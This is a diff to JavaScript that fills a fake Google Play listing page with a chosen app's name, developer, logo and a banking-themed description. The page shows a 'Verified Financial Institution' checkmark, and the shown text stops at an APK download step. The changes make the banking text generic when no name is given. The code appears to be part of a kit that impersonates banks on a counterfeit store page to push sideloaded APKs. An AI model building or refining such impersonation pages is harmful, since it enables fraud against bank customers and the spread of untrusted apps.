@@ -37,18 +37,20 @@ async function loadPublishedApp() {
 
 	function applyAppData(app) {
 		if (!app) return;
-		const name = app.name || appName || 'Mobile Banking';
+		const name = app.name || appName || '';
 		
 		// 1. Update Document Title dynamically
-		document.title = `${name}: Mobile Banking & Financial Services - Apps on Google Play`;
+		if (name) {
+			document.title = `${name} - Apps on Google Play`;
+		}
 		
 		// 2. Update Main App Name heading
 		const nameEl = document.querySelector('#appName');
-		if (nameEl) nameEl.textContent = name;
+		if (nameEl && name) nameEl.textContent = name;
 
 		// 3. Update Developer Name
 		const devEl = document.querySelector('#appDeveloper');
-		if (devEl) {
+		if (devEl && name) {
 			const devName = app.developer || `${name} Official`;
 			devEl.innerHTML = `${devName} <span class="verified" title="Verified Financial Institution">✓</span>`;
 		}
@@ -59,7 +61,7 @@ async function loadPublishedApp() {
 
 		// 5. Update Description
 		const descEl = document.querySelector('#appDescription');
-		if (descEl) descEl.textContent = app.description || `Official ${name} Mobile Banking app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security. Built with 256-bit bank-grade encryption.`;
+		if (descEl) descEl.textContent = app.description || (name ? `Official ${name} app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security.` : '');
 
 		// 6. Update Version
 		const verEl = document.querySelector('#appVersion');
@@ -70,13 +72,13 @@ async function loadPublishedApp() {
 		const logoContainer = document.querySelector('.app-logo');
 		if (logoEl && (app.logoUrl || appLogo)) {
 			logoEl.src = app.logoUrl || appLogo;
-			logoEl.alt = `${name} Logo`;
+			logoEl.alt = `${name || 'App'} Logo`;
 			if (logoContainer) logoContainer.classList.remove('loading');
 		}
 
 		// 8. Update Breadcrumb trail
 		const breadcrumbEl = document.querySelector('.breadcrumbs span:last-child');
-		if (breadcrumbEl) breadcrumbEl.textContent = `${name} - Mobile Banking`;
+		if (breadcrumbEl && name) breadcrumbEl.textContent = name;
 
 		// 9. Update APK Download Dataset
 		if (installButton) {
